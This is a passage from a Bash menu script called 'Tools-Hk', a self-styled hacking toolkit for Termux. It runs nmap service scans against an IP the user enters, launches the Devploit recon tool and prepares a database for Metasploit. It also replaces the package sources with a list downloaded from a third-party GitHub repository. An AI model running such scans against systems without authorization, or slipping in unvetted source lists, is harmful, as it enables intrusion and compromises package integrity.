bash Tools-Hk.sh
fi
fi
if [ $usage = 7 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ---------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Scan port"
echo ""
echo -e $green     "1- nmap"
echo -e $green     "2- Devploit"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read scanport1
if [ $scanport1 = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip  web/device "
echo -e $red
read ip
echo ""
toilet "Loading" 
nmap -sV $ip
fi
if [ $scanport1 = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport1 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $name = 4 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Repair Termux && Gnuroot"
echo ""
echo -e $green     "1- update && upgrade"
echo ""
echo -e $green     "2- repair source.list"
echo ""
echo -e $green     "3- install language programming"
echo ""
echo -e $green     "4- repair dpkg"
echo ""
echo -e $green     "5- repair error metasploit to connect database"
echo ""
echo -e $green     "6- repair Tmux-Bunch-arm"
echo ""
echo ""

echo -e $green     "00- BACK"
echo ""
echo ""
read repair
if [ $repair = 1 ]
then
clear
figlet "update"
echo ""
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $repair = 2 ]
then
clear
figlet "repair source"
echo ""
echo -e $green "repair source.list for Termux-arm"
echo ""

apt update && apt upgrade -y

pkg install wget

wget https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/sources-arm.list.txt
mv sources-arm.list.txt sources.list
mv sources.list $PREFIX/etc/apt
apt update && apt upgrade -y
fi
if [ $repair = 3 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "install L.Programming"
echo ""
echo -e $green     "1- install python"
echo ""
echo -e $green     "2- install python2"
echo ""
echo -e $green     "3- install python3"
echo ""
echo -e $green     "4- install python-pip & python2-pip"
echo ""
echo -e $green     "5- install ruby"
echo ""
echo -e $green     "6- install Php"
echo ""
echo -e $green     "7- install java"
echo ""
echo ""

echo -e $green     "00- BACK"
echo ""
read language
if [ $language = 1 ]
then
clear
figlet "install py"
echo ""
apt-get install python -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 2 ]
then
clear
figlet "install py2"
echo ""
apt-get install python2 -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 3 ]
then
clear
figlet "install py3"
echo ""
apt-get install python3 -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 4 ]
then
clear
figlet "install pip & pip2"
echo ""
apt-get install python-pip -y
apt-get install python2-pip -y
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 5 ]
then
clear
figlet "install ruby"
echo ""
apt-get install ruby
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 6 ]
then
clear
figlet "Php"
echo ""
apt-get install php
apt-get update -y
apt-get upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 7 ]
then
clear
figlet "install java"
echo ""
apt-get update -y
apt-get upgrade -y
apt-get install dirmngr gnupg-curl -y
apt-key adv --keyserver pool.sks-keyservers.net --recv 9D6D488416B493F0
apt update
apt-get install openjdk-9-jdk-headless
apt update && apt upgrade -y
bash Tools-Hk.sh
fi
if [ $language = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $repair = 4 ]
then
clear
figlet "repair dpkg"
bash Tools-Hk.sh
fi
if [ $repair = 5 ]
then
clear
figlet "repair metasploit"
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql
pg_ctl -D $PREFIX/var/lib/postgresql start

bash Tools-Hk.sh
fi
if [ $repair = 6 ]
then
clear
figlet "repair Tmux-Bunch"
apt-get update -y
apt-get upgrade -y
apt-get install dirmngr gnupg-curl -y
apt-key adv --keyserver pool.sks-keyservers.net --recv 9D6D488416B493F0
apt update
apt install openjdk-9-jdk-headless
apt update && apt upgrade -y
bash Tools-Hk.sh
fi
if [ $repair = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $name = 5 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk"
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "      About me"
echo ""
echo -e $green "YOUTUBE: Mohammed Info "
echo ""
echo -e $green "FB: profionaldhim "
echo ""
echo -e $green "TWITTER: profionaldhim1 "
echo ""
echo -e $green "Whatsapp: 00967733014747"
echo ""
echo -e $green "00- Back"
echo ""
read about
if [ $about = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $name = 0 ]
then
clear
echo ""
echo ""
figlet "GOOD BYE"
echo -e $green "my channel on youtube"
echo -e $green 
"https://www.youtube.com/channel/UCn3bOntxwCxoOkFyJlW-kzA"
exit
fi

###################################